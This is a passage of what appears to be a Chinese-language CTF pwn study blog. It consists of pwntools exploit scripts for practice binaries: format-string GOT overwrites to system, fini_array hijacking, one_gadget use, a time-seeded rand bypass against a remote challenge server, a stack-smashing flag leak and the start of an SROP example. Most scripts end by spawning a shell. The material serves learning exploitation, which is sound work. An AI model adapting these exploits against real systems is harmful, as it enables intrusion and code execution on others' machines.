class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;set context-output /dev/pts/6&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;data: \n&quot;</span></span><br><span class="line">payload1 = <span class="string">b&quot;%19$p\x00&quot;</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">ibc_start_main = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">0x30</span></span><br><span class="line">libc_base = ibc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">low = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">high = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(low).encode() + <span class="string">b&#x27;c%12$hhn&#x27;</span> <span class="comment"># 改1个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> + high - low).encode() + <span class="string">b&#x27;c%13$hn&#x27;</span> <span class="comment"># 改2个字节</span></span><br><span class="line"><span class="comment"># 一般是后面3个字节不同，前面3个字节都是一样的</span></span><br><span class="line"><span class="comment"># printf@libc: 0x7f0bc02606f0 &lt;printf&gt;</span></span><br><span class="line"><span class="comment"># system@libc: 0x7f0bc0250d70 &lt;system&gt;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">1</span>)</span><br><span class="line">io.sendafter(delim, payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(delim, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>buf是全局变量的fmtstr，栈的特点是素质三连 addr1(esp,ebp) -&gt; addr2 -&gt; addr3</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./fmt_str_level_2_x64&quot;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;hello\n&quot;</span></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%13$p\x00&quot;</span></span><br><span class="line">io.send(payload1)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recv(), <span class="number">16</span>)</span><br><span class="line">process_base = main_addr - elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = process_base + elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;main&gt;:\t\t&quot;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;base&gt;:\t&quot;</span>, <span class="built_in">hex</span>(process_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;printf@got&gt;:\t&quot;</span>, <span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;%31$p\x00&quot;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">libc_start_main_133 = <span class="built_in">int</span>(io.recv(), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_133 - <span class="number">133</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;__libc_start_main+133&gt;:\t&quot;</span>, libc_start_main_133)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:\t&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc:\t&quot;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&quot;%6$p\x00&quot;</span></span><br><span class="line">io.send(payload3)</span><br><span class="line">play_rbp = <span class="built_in">int</span>(io.recv(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;rbp@play&gt;:\t&quot;</span>, <span class="built_in">hex</span>(play_rbp))</span><br><span class="line">addr1 = play_rbp - <span class="number">0x8</span></span><br><span class="line">addr2 = play_rbp + <span class="number">0x8</span></span><br><span class="line">addr3 = play_rbp + <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">addrs = [addr1, addr2, addr3]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    payload4 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addrs[i] &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%6$hn\x00&quot;</span></span><br><span class="line">    io.send(payload4)</span><br><span class="line">    io.interactive() <span class="comment"># 远端printf输出太长了,缓冲区需要分批发出,本地的recv()一次不够用,换interactive()持续接收,用ctrl+c退出让exp脚本继续进行下一步了</span></span><br><span class="line">    payload5 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((printf_got + i * <span class="number">2</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;c%8$hn\x00&quot;</span></span><br><span class="line">    io.send(payload5)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">system_addr_1 = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line">system_addr_2 = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">system_addr_3 = (system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(system_addr_1).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%7$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - system_addr_1 + system_addr_2).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%9$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> - system_addr_2 + system_addr_3).encode() + <span class="string">b&quot;c&quot;</span> + <span class="string">b&quot;%13$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;main&gt;:\t\t&quot;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;base&gt;:\t&quot;</span>, <span class="built_in">hex</span>(process_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;printf@got&gt;:\t&quot;</span>, <span class="built_in">hex</span>(printf_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;rbp@play&gt;:\t&quot;</span>, <span class="built_in">hex</span>(play_rbp))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;__libc_start_main+133&gt;:\t&quot;</span>, <span class="built_in">hex</span>(libc_start_main_133))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:\t&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system@libc:\t&quot;</span>, <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>x86 只输入一次字符串 关闭PIE 修改fini_entry</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./fmt_str_once_x86&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;printf&#x27;</span>])) <span class="comment"># printf@plt</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf.got[<span class="string">&#x27;printf&#x27;</span>])) <span class="comment"># printf@got</span></span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">fini_entry_addr = <span class="number">0x804B234</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;fini_entry_addr: main_addr, printf_got: system_plt&#125;)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>fmtstr只输入一次，但是payload太长只能使用one_gadget</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1. 泄露libc基地址,泄露栈地址,修改fini_entry为main地址</span></span><br><span class="line"><span class="comment">#2. 修改栈实现ROP</span></span><br><span class="line"><span class="comment"># 分两步走,第一步:泄露, 第二步:攻击</span></span><br><span class="line">pwnfile = <span class="string">&quot;./fmt_str_once_sys_x64_nopie&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;input:\n&quot;</span></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">fini_entry = <span class="number">0x4031D0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 控制 _exit() 返回到 main()</span></span><br><span class="line">payload1 = <span class="string">b&quot;%40$p%16$s&quot;</span>.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 同时泄露rbp和基地址</span></span><br><span class="line">numbwritten = <span class="number">14</span> + <span class="number">6</span> + <span class="number">6</span> <span class="comment"># len(%40$p) + len(%16$s) + len(&#x27;a&#x27;*6)</span></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">8</span>, &#123;fini_entry: main_addr&#125;, numbwritten)</span><br><span class="line">payload3 = p64(puts_got)</span><br><span class="line">payload = flat([payload1, payload2, payload3])</span><br><span class="line">io.send(payload) <span class="comment"># 泄露</span></span><br><span class="line"></span><br><span class="line">main_rbp_1 = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">dofunc_rbp_1 = main_rbp_1 - <span class="number">0x10</span></span><br><span class="line">dofunc_rbp_2 = main_rbp_1 - <span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">puts_libc = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;#1 &lt;rbp@main&gt;:&quot;</span>, <span class="built_in">hex</span>(main_rbp_1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;#1 &lt;rbp@dofunc&gt;:&quot;</span>, <span class="built_in">hex</span>(dofunc_rbp_1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;#2 &lt;rbp@dofunc&gt;:&quot;</span>, <span class="built_in">hex</span>(dofunc_rbp_2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc_base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;system_base&gt;:&quot;</span>, <span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;/bin/sh&gt;:&quot;</span>, <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"><span class="comment"># ------------------------------分界线----------------------------------#</span></span><br><span class="line">rbp = dofunc_rbp_2</span><br><span class="line">ret = rbp + <span class="number">0x8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401363</span></span><br><span class="line"><span class="comment"># 这种方式发出去的字节太长了,超出了read()的范围</span></span><br><span class="line"><span class="comment"># writes = &#123;ret: pop_rdi_ret, rbp+0x10: bin_sh_addr, rbp+0x18: system_libc&#125;</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(6, writes)</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6aee</span> <span class="comment"># execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;one_gadget&gt;:&quot;</span>, <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;ret: one_gadget&#125;) <span class="comment"># 用 one_gadegt打</span></span><br><span class="line">io.sendafter(delim, payload) <span class="comment"># 攻击</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 &lt;dofunc&gt; RBP  0x7ffc67436120 —▸ 0x7ffc67436130 ◂— 0</span></span><br><span class="line"><span class="comment"># 2 &lt;dofunc&gt; RBP  0x7ffc67436040 —▸ 0x7ffc67436050 —▸ 0x7ffc674360d0 ◂— 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="comment"># 0x4d74c posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rsp+0x68 is writable</span></span><br><span class="line"><span class="comment">#   rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="comment">#   rax == NULL || &#123;&quot;sh&quot;, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   rbx == NULL || (u16)[rbx] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4d753 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rsp+0x68 is writable</span></span><br><span class="line"><span class="comment">#   rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="comment">#   rcx == NULL || &#123;rcx, rax, rip+0x14a6c3, r12, ...&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   rbx == NULL || (u16)[rbx] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xd636b execve(&quot;/bin/sh&quot;, rbp-0x40, r13)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x38 is writable</span></span><br><span class="line"><span class="comment">#   rdi == NULL || &#123;&quot;/bin/sh&quot;, rdi, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   [r13] == NULL || r13 == NULL || r13 is a valid envp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>随机数绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./test&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;47.97.58.52&quot;</span>, <span class="number">40003</span>)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num = libc.rand() % <span class="number">100</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line">flag_fd = <span class="number">2</span> + num + <span class="number">1</span></span><br><span class="line">io.recv()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(flag_fd).encode())</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>stack smashing，仅限 libc_2.23</strong></p><p>栈上的某个位置保存着指向文件名字符串的指针，程序会从这个栈格子上获取文件名字符串的地址。</p><p><code>search /mnt/hgfs</code>找到文件名字符串的地址，<code>search -p 0x7fffffffe4ea</code>查找栈上哪个地址存储了文件名字符串的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RDX  0x7fffffffe088[stack] —▸ 0x7fffffffe4ea ◂— &#x27;/mnt/hgfs/Shared/stack_smash_libc2_23_x64&#x27;</span><br><span class="line"></span><br><span class="line">   0x7ffff787764e    mov    rcx, qword ptr [rdx]            RCX, [0x7fffffffe088] =&gt; 0x7fffffffe4ea ◂— &#x27;/mnt/hgfs/Shared/stack_smash_libc2_23_x64&#x27;</span><br><span class="line">   0x7ffff7877651    add    rbx, 2                          RBX =&gt; 0x7ffff798f5ad (0x7ffff798f5ab + 0x2)</span><br><span class="line">   0x7ffff7877655    mov    rdi, rcx                        RDI =&gt; 0x7fffffffe4ea ◂— &#x27;/mnt/hgfs/Shared/stack_smash_libc2_23_x64&#x27;</span><br><span class="line"> ► 0x7ffff7877658    mov    qword ptr [rbp - 0x90], rcx     [0x7fffffffe040] =&gt; 0x7fffffffe4ea ◂— &#x27;/mnt/hgfs/Shared/stack_smash_libc2_23_x64&#x27;</span><br><span class="line">   0x7ffff787765f    call   strlen                      &lt;strlen&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./stack_smash_libc2_23_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"> </span><br><span class="line">buf_flag = elf.symbols[<span class="string">&quot;buf_flag&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">padding = cyclic(<span class="number">0x108</span>)</span><br><span class="line">payload = padding + p64(buf_flag)</span><br><span class="line">delim = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delim, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>SROP</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h</span><br><span class="line">mov     rsi, rsp</span><br><span class="line">mov     rdi, rax</span><br><span class="line">syscall</span><br><span class="line">retn</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA─────────────────────────────────</span><br><span class="line">────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────</span><br><span class="line"> RAX  0</span><br><span class="line"> RDX  0x400</span><br><span class="line"> RDI  0</span><br><span class="line"> RSI  0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line"> RSP  0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax</span><br><span class="line">*RIP  0x40100e (_start+14) ◂— syscall</span><br><span class="line">──────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────</span><br><span class="line">   0x401000 &lt;_start&gt;       xor    rax, rax         RAX =&gt; 0</span><br><span class="line">   0x401003 